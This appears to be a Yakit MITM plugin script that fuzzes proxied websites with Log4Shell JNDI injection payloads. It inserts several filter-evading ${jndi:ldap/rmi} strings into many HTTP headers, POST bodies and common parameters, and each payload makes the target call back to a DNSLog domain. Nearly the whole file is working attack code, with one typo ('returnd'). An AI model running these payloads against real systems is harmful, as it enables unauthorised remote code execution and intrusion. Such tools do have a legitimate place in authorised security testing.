# mitm plugin template
domain = MITM_PARAMS["domain"]

yakit_output(str.f("使用 DNSLog 触发域名: %v", domain))

#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "https://example.com/asdfas?id=test")
    if err != nil {
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results

    mirrorNewWebsite(results...)
    mirrorNewWebsitePathParams(results...)
}

headers = [
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Forwarded-For",
    "X-Originating-IP",
    "User-Agent",
    "Referer",
    "CF-Connecting_IP",
    "True-Client-IP",
    "X-Real-IP",
    "X-Client-IP",
    "Contact",
    "X-Wap-Profile",
    "X-APi-Version",
    "Content-Type",
    "Accept",
    "Content-Encoding",
]

templates = [
    "${jndi:ldap://%v/{{randstr(10,10)}}}",
    "${jndi: ${::l}dap://%v/{{randstr(10,10)}}}",
    "${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://%v/{{randstr(10,10)}}}",
    "${${::-j}ndi:rmi://%v/{{randstr(10,10)}}}",
    "${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://%v/{{randstr(10,10)}}}",
    // "${${lower:jndi}: ${lower:rmi}://%v/{{randstr(10,10)}}",
]

fuzzLog4jPaylodas = func(domain) {
    res = make([]string)
    for _, t := range templates {
        res = append(res, sprintf(t, domain))
    }
    return res
}

// https://github.com/test502git/log4j-fuzz-head-poc/blob/main/log4j-fuzz-head-poc-v2.yaml
# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！
mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    freq, err := fuzz.HTTPRequest(req)
    if err != nil {
        returnd
    }

    originFReq = freq
    for _, value := range fuzzLog4jPaylodas(domain) {
        freq = originFReq
        for _, header := range headers {
            freq = freq.FuzzHTTPHeader(header, value)
        }
        res, err := freq.Exec(httpool.https(isHttps))
        if err != nil {
            yakit_output("执行失败")
            continue
        }
        for result := range res {
            if result.Error == nil {
                yakit_output({
                    "message": sprintf("发送成功:%v", result.Url),
                    "payload": value,
                })
            }
        }
    }
}

# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    freq, err := fuzz.HTTPRequest(req)
    if err != nil {
        return
    }

    for _, value := range fuzzLog4jPaylodas(domain) {
        nFreq := freq.FuzzMethod("POST").FuzzPostRaw(value)
        nFreq.Show()
        res, err := nFreq.Exec(httpool.https(isHttps));
        if res != nil {
            for result := range res {
                if result.Error == nil {
                    yakit_output({
                        "message": sprintf("发送成功:%v", result.Url),
                        "payload": value,
                    })
                }
            }
        }
    }

    for _, r := range freq.GetCommonParams() {
        // ${jndi:ldap://{{interactsh-url}}/info}
        for _, value := range fuzzLog4jPaylodas(domain) {
            res, err := r.Fuzz(value).Exec(httpool.https(isHttps))
            if err != nil {
                yakit_output(str.f("exec httpool fuzz obj failed: %s", err))
                continue
            }

            for result := range res {
                if result.Error == nil {
                    yakit_output({
                        "message": sprintf("发送成功:%v", result.Url),
                        "payload": value,
                    })
                }
            }
        }
    }
}